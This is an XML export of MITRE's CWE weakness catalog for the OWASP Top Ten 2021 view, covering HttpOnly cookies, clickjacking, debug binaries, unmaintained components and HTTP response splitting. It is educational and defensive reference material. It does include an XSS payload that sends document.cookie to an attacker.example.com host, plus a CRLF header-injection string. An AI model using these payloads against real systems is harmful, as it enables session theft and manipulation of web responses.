<?xml version="1.0" encoding="UTF-8"?>
<Weakness_Catalog xmlns="http://cwe.mitre.org/cwe-6" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" Name="VIEW LIST: CWE-1344: Weaknesses in OWASP Top Ten (2021)" Version="4.10" Date="2023-01-31" xsi:schemaLocation="http://cwe.mitre.org/cwe-6 http://cwe.mitre.org/data/xsd/cwe_schema_v6.10.xsd">
   <Weaknesses>
      <Weakness ID="1004" Name="Sensitive Cookie Without 'HttpOnly' Flag" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.</Description>
         <Extended_Description>The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not reveal the contents of the cookie to a third party via client-side script executed via XSS.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="732" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>An HTTP cookie is a small piece of data attributed to a specific website and stored on the user's computer by the user's web browser. This data can be leveraged for a variety of purposes including saving information entered into form fields, recording user activity, and for authentication purposes. Cookies used to save or record information generated by the user are accessed and modified by script code embedded in a web page. While cookies used for authentication are created by the website's server and sent to the user to be attached to future requests. These authentication cookies are often not meant to be accessed by the web page sent to the user, and are instead just supposed to be attached to future requests to verify authentication details.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>If the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>If the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Leverage the HttpOnly flag when setting a sensitive cookie in a response.</Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>While this mitigation is effective for protecting cookies from a browser's own scripting engine, third-party components or plugins may have their own engines that allow access to cookies. Attackers might also be able to use XMLHTTPResponse to read the headers directly and obtain the cookie.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be sent to the website with each request made by the client.</Intro_Text>
               <Body_Text>The snippet of code below establishes a new cookie to hold the sessionID.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String sessionID = generateSessionId();<xhtml:br/>Cookie c = new Cookie("session_id", sessionID);<xhtml:br/>response.addCookie(c);</xhtml:div>
               </Example_Code>
               <Body_Text>The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as:</Body_Text>
               <Example_Code Nature="Attack" Language="JavaScript">
                  <xhtml:div>document.write('&lt;img src="http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '"&gt;'</xhtml:div>
               </Example_Code>
               <Body_Text>When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the request and steal the cookie.</Body_Text>
               <Body_Text>To mitigate the risk, use the setHttpOnly(true) method.</Body_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>String sessionID = generateSessionId();<xhtml:br/>Cookie c = new Cookie("session_id", sessionID);<xhtml:br/>c.setHttpOnly(true);<xhtml:br/>response.addCookie(c);</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2014-3852</Reference>
               <Description>CMS written in Python does not include the HTTPOnly flag in a Set-Cookie header, allowing remote attackers to obtain potentially sensitive information via script access to this cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2014-3852</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2015-4138</Reference>
               <Description>Appliance for managing encrypted communications does not use HttpOnly flag.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2015-4138</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-2"/>
            <Reference External_Reference_ID="REF-3"/>
            <Reference External_Reference_ID="REF-4"/>
            <Reference External_Reference_ID="REF-5"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2017-01-02</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1021" Name="Improper Restriction of Rendered UI Layers or Frames" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The web application does not restrict or incorrectly restricts frame objects or UI layers that belong to another application or domain, which can lead to user confusion about which interface the user is interacting with.</Description>
         <Extended_Description>A web application is expected to place restrictions on whether it is allowed to be rendered within frames, iframes, objects, embed or applet elements. Without the restrictions, users can be tricked into interacting with the application when they were not intending to.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="441" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="451" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Clickjacking</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>UI Redress Attack</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Tapjacking</Term>
               <Description>"Tapjacking" is similar to clickjacking, except it is used for mobile applications in which the user "taps" the application instead of performing a mouse click.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Note>An attacker can trick a user into performing actions that are masked and hidden from the user's view. The impact varies widely, depending on the functionality of the underlying application. For example, in a social media application, clickjacking could be used to trik the user into changing privacy settings.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>The use of X-Frame-Options allows developers of web content to restrict the usage of their application within the form of overlays, frames, or iFrames. The developer can indicate from which domains can frame the content.</xhtml:p>
                  <xhtml:p>The concept of X-Frame-Options is well documented, but implementation of this protection mechanism is in development to cover gaps. There is a need for allowing frames from multiple domains.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>A developer can use a "frame-breaker" script in each page that should not be framed. This is very helpful for legacy browsers that do not support X-Frame-Options security feature previously mentioned.</xhtml:p>
                  <xhtml:p>It is also important to note that this tactic has been circumvented or bypassed. Improper usage of frames can persist in the web application through nested frames. The "frame-breaking" script does not intuitively account for multiple nested frames that can be presented to the user.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>This defense-in-depth technique can be used to prevent the improper usage of frames in web applications. It prioritizes the valid sources of data to be loaded into the application through the usage of declarative policies. Based on which implementation of Content Security Policy is in use, the developer should use the "frame-ancestors" directive or the "frame-src" directive to mitigate this weakness. Both directives allow for the placement of restrictions when it comes to allowing embedded content.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2017-7440</Reference>
               <Description>E-mail preview feature in a desktop application allows clickjacking attacks via a crafted e-mail message</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-7440</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-5697</Reference>
               <Description>Hardware/firmware product has insufficient clickjacking protection in its web user interface</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-5697</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-4015</Reference>
               <Description>Clickjacking in data-loss prevention product via HTTP response header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-4015</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2016-2496</Reference>
               <Description>Tapjacking in permission dialog for mobile OS allows access of private storage using a partially-overlapping window.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2016-2496</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2015-1241</Reference>
               <Description>Tapjacking in web browser related to page navigation and touch/gesture events.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2015-1241</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-0492</Reference>
               <Description>System UI in mobile OS allows a malicious application to create a UI overlay of the entire screen to gain privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-0492</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="103"/>
            <Related_Attack_Pattern CAPEC_ID="181"/>
            <Related_Attack_Pattern CAPEC_ID="222"/>
            <Related_Attack_Pattern CAPEC_ID="504"/>
            <Related_Attack_Pattern CAPEC_ID="506"/>
            <Related_Attack_Pattern CAPEC_ID="587"/>
            <Related_Attack_Pattern CAPEC_ID="654"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-35"/>
            <Reference External_Reference_ID="REF-36"/>
            <Reference External_Reference_ID="REF-37"/>
            <Reference External_Reference_ID="REF-38"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2017-08-01</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="11" Name="ASP.NET Misconfiguration: Creating Debug Binary" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>Debugging messages help attackers learn about the system and plan a form of attack.</Description>
         <Extended_Description>ASP .NET applications can be configured to produce debug binaries. These binaries give detailed debugging messages and should not be used in production environments. Debug binaries are meant to be used in a development or testing environment and can pose a security risk if they are deployed to production.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="489" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="ASP.NET" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>The debug attribute of the &lt;compilation&gt; tag defines whether compiled binaries should include debugging information. The use of debug binaries causes an application to provide as much information about itself as possible to the user.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Build and Compilation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Attackers can leverage the additional information they gain from debugging output to mount attacks targeted on the framework, database, or other resources used by the application.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Avoid releasing debug binaries into the production environment. Change the debug mode to false when the application is deployed into production.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The file web.config contains the debug mode setting. Setting debug to "true" will let the browser display debugging information.</Intro_Text>
               <Example_Code Nature="Bad" Language="XML">
                  <xhtml:div>&lt;?xml version="1.0" encoding="utf-8" ?&gt;<xhtml:br/>&lt;configuration&gt;<xhtml:div style="margin-left:1em;">&lt;system.web&gt;<xhtml:div style="margin-left:1em;">&lt;compilation<xhtml:br/>defaultLanguage="c#"<xhtml:br/>debug="true"<xhtml:br/>/&gt;<xhtml:br/>...</xhtml:div>&lt;/system.web&gt;</xhtml:div>&lt;/configuration&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Change the debug mode to false when the application is deployed into production.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>ASP.NET Misconfiguration: Creating Debug Binary</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Demonstrative_Example, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Background_Details, Common_Consequences, Demonstrative_Examples, Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1104" Name="Use of Unmaintained Third Party Components" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product relies on third-party components that are not
					actively supported or maintained by the original developer or a trusted proxy
					for the original developer.</Description>
         <Extended_Description><xhtml:p>Reliance on components that are no longer maintained can make it difficult or impossible to fix significant bugs, vulnerabilities, or quality issues. In effect, unmaintained code can become obsolete.</xhtml:p>
<xhtml:p>This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.</xhtml:p></Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1357" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Indirect</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
		 <Applicable_Platforms>
		   <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
		   <Technology Class="ICS/OT" Prevalence="Undetermined"/>
		 </Applicable_Platforms>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Reduce Maintainability</Impact>
            </Consequence>
         </Common_Consequences>
         <References>
            <Reference External_Reference_ID="REF-1212"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2018-07-02</Submission_Date>
               <Submission_Comment>Entry derived from Common Quality Enumeration (CQE) Draft 0.9.</Submission_Comment>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="113" Name="Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product receives data from an HTTP agent/component (e.g., web server, proxy, browser, etc.), but it does not neutralize or incorrectly neutralizes CR and LF characters before the data is included in outgoing HTTP headers.</Description>
         <Extended_Description>
	   <xhtml:p>
	     HTTP agents or components may include a web server, load balancer, reverse proxy, web caching proxy, application firewall, web browser, etc. Regardless of the role, they are expected to maintain coherent, consistent HTTP communication state across all components. However, including unexpected data in an HTTP header allows an attacker to specify the entirety of the HTTP message that is rendered by the client HTTP agent (e.g., web browser) or back-end HTTP agent (e.g., web server), whether the message is part of a request or a response.
	   </xhtml:p>
            <xhtml:p>When an HTTP request contains unexpected CR and LF characters, the server may respond with an output stream that is interpreted as "splitting" the stream into two different HTTP messages instead of one. CR is carriage return, also given by %0d or \r, and LF is line feed, also given by %0a or \n.</xhtml:p>
	    <xhtml:p>In addition to CR and LF characters, other valid/RFC compliant special characters and unique character encodings can be utilized, such as HT (horizontal tab, also given by %09 or \t) and SP (space, also given as + sign or %20).</xhtml:p>
	    <xhtml:p>These types of unvalidated and unexpected data in HTTP message headers allow an attacker to control the second "split" message to mount attacks such as server-side request forgery, cross-site scripting, and cache poisoning attacks.</xhtml:p>
            <xhtml:p>HTTP response splitting weaknesses may be present when:</xhtml:p>
               <xhtml:ol>
                  <xhtml:li>Data enters a web application through an untrusted source, most frequently an HTTP request.</xhtml:li>
                  <xhtml:li>The data is included in an HTTP response header sent to a web user without neutralizing malicious characters that can be interpreted as separator characters for headers.</xhtml:li>
               </xhtml:ol>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="93" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="79" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="700" Ordinal="Primary"/>
	    <Related_Weakness Nature="ChildOf" CWE_ID="436" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>HTTP Request Splitting</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>HTTP Response Splitting</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Access Control</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>CR and LF characters in an HTTP header may give attackers control of the remaining headers and body of the message that the application intends to send/receive, as well as allowing them to create additional messages entirely under their control.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Construct HTTP headers very carefully, avoiding the use of non-validated input data.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. If an input does not strictly conform to specifications, reject it or transform it into something that conforms.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-30">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-20">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code segment reads the name of the author of a weblog entry, author, from an HTTP request and sets it in a cookie header of an HTTP response.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String author = request.getParameter(AUTHOR_PARAM);<xhtml:br/>...<xhtml:br/>Cookie cookie = new Cookie("author", author);<xhtml:br/>cookie.setMaxAge(cookieExpiration);<xhtml:br/>response.addCookie(cookie);</xhtml:div>
               </Example_Code>
               <Body_Text>Assuming a string consisting of standard alpha-numeric characters, such as "Jane Smith", is submitted in the request the HTTP response including this cookie might take the following form:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>HTTP/1.1 200 OK<xhtml:br/>...<xhtml:br/>Set-Cookie: author=Jane Smith<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>However, because the value of the cookie is composed of unvalidated user input, the response will only maintain this form if the value submitted for AUTHOR_PARAM does not contain any CR and LF characters. If an attacker submits a malicious string, such as</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>Wiley Hacker\r\nHTTP/1.1 200 OK\r\n</xhtml:div>
               </Example_Code>
               <Body_Text>then the HTTP response would be split into two responses of the following form:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>HTTP/1.1 200 OK<xhtml:br/>...<xhtml:br/>Set-Cookie: author=Wiley Hacker<xhtml:br/>HTTP/1.1 200 OK<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The second response is completely controlled by the attacker and can be constructed with any header and body content desired. The ability to construct arbitrary HTTP responses permits a variety of resulting attacks, including:</Body_Text>
               <Body_Text>
                  <xhtml:ul>
                     <xhtml:li>
                        <xhtml:div>cross-user defacement</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>web and browser cache poisoning</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>cross-site scripting</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>page hijacking</xhtml:div>
                     </xhtml:li>
                  </xhtml:ul>
               </Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>An attacker can make a single request to a vulnerable server that will cause the server to create two responses, the second of which may be misinterpreted as a response to a different request, possibly one made by another user sharing the same TCP connection with the server.</Intro_Text>
               <Body_Text>
                 <xhtml:p>Cross-User Defacement can be accomplished by convincing the user to submit the malicious request themselves, or remotely in situations where the attacker and the user share a common TCP connection to the server, such as a shared proxy server.</xhtml:p>
                        <xhtml:ul>
                           <xhtml:li>
                              In the best case, an attacker can leverage this ability to convince users that the application has been hacked, causing users to lose confidence in the security of the application.
                           </xhtml:li>
                           <xhtml:li>
                              In the worst case, an attacker may provide specially crafted content designed to mimic the behavior of the application but redirect private information, such as account numbers and passwords, back to the attacker.
                           </xhtml:li>
                        </xhtml:ul>
               </Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The impact of a maliciously constructed response can be magnified if it is cached, either by a web cache used by multiple users or even the browser cache of a single user.</Intro_Text>
               <Body_Text>
                 <xhtml:p>Cache Poisoning: if a response is cached in a shared web cache, such as those commonly found in proxy servers, then all users of that cache will continue receive the malicious content until the cache entry is purged. Similarly, if the response is cached in the browser of an individual user, then that user will continue to receive the malicious content until the cache entry is purged, although the user of the local browser instance will be affected.</xhtml:p>
               </Body_Text>
